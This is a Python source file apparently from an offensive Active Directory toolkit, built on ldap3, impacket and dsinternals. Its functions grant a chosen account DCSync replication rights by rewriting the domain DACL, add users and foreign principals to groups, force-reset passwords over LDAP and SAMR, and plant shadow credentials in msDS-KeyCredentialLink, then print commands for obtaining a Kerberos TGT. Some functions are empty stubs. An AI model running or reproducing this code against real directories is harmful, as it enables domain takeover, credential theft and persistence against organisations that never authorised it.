import ldap3, binascii, impacket, random, string
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword
from impacket.examples.ntlmrelayx.attacks import ldapattack
from impacket.examples.ntlmrelayx.utils import config
from impacket.ldap import ldaptypes
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential

# Create an object ACE with the specified privguid and our sid
# accesstype should be specified as either a write property flag or access control (for extended attributes)
def create_object_ace(privguid, sid, accesstype):
    nace = ldaptypes.ACE()
    nace['AceType'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE
    nace['AceFlags'] = 0x00
    acedata = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE()
    acedata['Mask'] = ldaptypes.ACCESS_MASK()
    acedata['Mask']['Mask'] = accesstype
    acedata['ObjectType'] = impacket.uuid.string_to_bin(privguid)
    acedata['InheritedObjectType'] = b''
    acedata['Sid'] = ldaptypes.LDAP_SID()
    acedata['Sid'].fromCanonical(sid)
    acedata['Flags'] = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_OBJECT_TYPE_PRESENT
    nace['Ace'] = acedata
    return nace

def getDn(conn, sAMAccountName):
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName)
    try:
        return conn.response[0]['dn']
    except IndexError:
        raise Exception('User not found in LDAP: %s' % sAMAccountName)
    return

def ldapConnect(url, domain, username, password, doKerberos):
    # Connect to LDAP
    s = ldap3.Server(url, get_info=ldap3.DSA)

    if doKerberos:
        c = ldap3.Connection(s, authentication=ldap3.SASL, sasl_mechanism=ldap3.KERBEROS, sasl_credentials=(ldap3.ReverseDnsSetting.REQUIRE_RESOLVE_ALL_ADDRESSES,))
    else:
        c = ldap3.Connection(s, user='%s\\%s' % (domain,username), password=password, authentication=ldap3.NTLM)
    
    c.bind()
    return c

def writeGpoDacl():
	return

def addComputer():
	return

def addUser():
	return

def addUserToGroup(conn, params):
    member_dn = getDn(conn, params[0])
    group_dn = getDn(conn, params[1])
    addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)


#def addForeignUserToGroup(conn, user_sid, group_dn):
def addForeignUserToGroup(conn, params):
    """
    Add a foreign principals (coming from a trusted domain) to a group
    Args: 
        foreign user sid
        group dn in which to add the foreign user
    """
    user_sid = params[0]
    group_dn = params[1]
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(conn, magic_user_dn, group_dn, raise_error=True)


def addDomainSync(conn, params):
    # Query for the sid of our target user
    sAMAccountName = params[0]

    conn.search(conn.server.info.other['rootDomainNamingContext'], '(sAMAccountName=%s)' % sAMAccountName, attributes=['objectSid'])
    sid_object = ldaptypes.LDAP_SID(conn.entries[0]['objectSid'].raw_values[0])
    user_sid = sid_object.formatCanonical()


    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    conn.search(conn.server.info.other['rootDomainNamingContext'], '(&(objectCategory=domain))', attributes=['SAMAccountName','nTSecurityDescriptor'], controls=controls)
    entry = conn.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))
    secDesc['Dacl']['Data'].append(create_object_ace('1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', user_sid, accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)

def changePassword(conn, params):
    target = params[0]
    new_pass = params[1]
    target_dn = getDn(conn, target)

    modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
    if conn.result['result'] == 0:
        print('Password changed successfully!')
    else:
        if conn.result['result'] == 50:
            raise Exception('Could not modify object, the server reports insufficient rights: ' + conn.result['message'])
        elif conn.result['result'] == 19:
            raise Exception('Could not modify object, the server reports a constrained violation: ' + conn.result['message'])
        else:
            raise Exception('The server returned an error: ' + conn.result['message'])

from impacket.dcerpc.v5 import samr, transport

def cryptPassword(session_key, password):

    try:
        from Cryptodome.Cipher import ARC4
    except Exception:
        print("Warning: You don't have any crypto installed. You need pycryptodomex")
        print("See https://pypi.org/project/pycryptodomex/")

    from impacket import crypto
    
    sam_user_pass = samr.SAMPR_USER_PASSWORD()
    encoded_pass = password.encode('utf-16le')
    plen = len(encoded_pass)
    sam_user_pass['Buffer'] = b'A'*(512-plen) + encoded_pass
    sam_user_pass['Length'] = plen
    pwdBuff = sam_user_pass.getData()

    rc4 = ARC4.new(session_key)
    encBuf = rc4.encrypt(pwdBuff)
    
    sam_user_pass_enc = samr.SAMPR_ENCRYPTED_USER_PASSWORD()
    sam_user_pass_enc['Buffer'] = encBuf
    return sam_user_pass_enc

def rpcChangePassword(domain, username, password, hostname, params):
    target = params[0]
    new_pass = params[1]

    rpctransport = transport.SMBTransport(hostname, filename=r'\samr')
    rpctransport.set_credentials(username, password, domain)
    dce = rpctransport.get_dce_rpc()
    from impacket.dcerpc.v5 import rpcrt
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)

    server_handle = samr.hSamrConnect(dce, hostname + '\x00')['ServerHandle']
    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)['DomainId']
    domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']   
    userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))['RelativeIds']['Element'][0]
    opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

    req = samr.SamrSetInformationUser2()
    req['UserHandle'] = opened_user['UserHandle']
    req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
    req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', new_pass)
    req['Buffer']['Internal5']['PasswordExpired'] = 0

    resp = dce.request(req)
    resp.dump()

def setDontreqpreauth():
	return
def setRbcd():
	return
def setShadowCredentials(conn, params):

    ShadowCredentialsOutfilePath = None
    ShadowCredentialsExportType = 'PEM'
    ShadowCredentialsPFXPassword = None

    sAMAccountName = params[0]
    target_dn = getDn(conn, sAMAccountName)
    print("Generating certificate")
    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    print("Certificate generated")
    print("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    print("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    print("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName', 'objectSid', 'msDS-KeyCredentialLink'])
    results = None
    for entry in conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        results = entry
    if not results:
        print('Could not query target user properties')
        return
    try:
        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
        print(new_values)
        print("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
        if conn.result['result'] == 0:
            print("Updated the msDS-KeyCredentialLink attribute of the target object")
            if ShadowCredentialsOutfilePath is None:
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                print("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
            else:
                path = ShadowCredentialsOutfilePath
            if ShadowCredentialsExportType == "PEM":
                certificate.ExportPEM(path_to_files=path)
                print("Saved PEM certificate at path: %s" % path + "_cert.pem")
                print("Saved PEM private key at path: %s" % path + "_priv.pem")
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
            elif ShadowCredentialsExportType == "PFX":
                if ShadowCredentialsPFXPassword is None:
                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                    print("No pass was provided. The certificate will be store with the password: %s" % password)
                else:
                    password = ShadowCredentialsPFXPassword
                certificate.ExportPFX(password=password, path_to_file=path)
                print("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                print("Must be used with password: %s" % password)
                print("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                print("Run the following command to obtain a TGT")
                print("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
        else:
            if conn.result['result'] == 50:
                print('Could not modify object, the server reports insufficient rights: %s' % conn.result['message'])
            elif conn.result['result'] == 19:
                print('Could not modify object, the server reports a constrained violation: %s' % conn.result['message'])
            else:
                print('The server returned an error: %s' % conn.result['message'])
    except IndexError:
        print('Attribute msDS-KeyCredentialLink does not exist')
    return

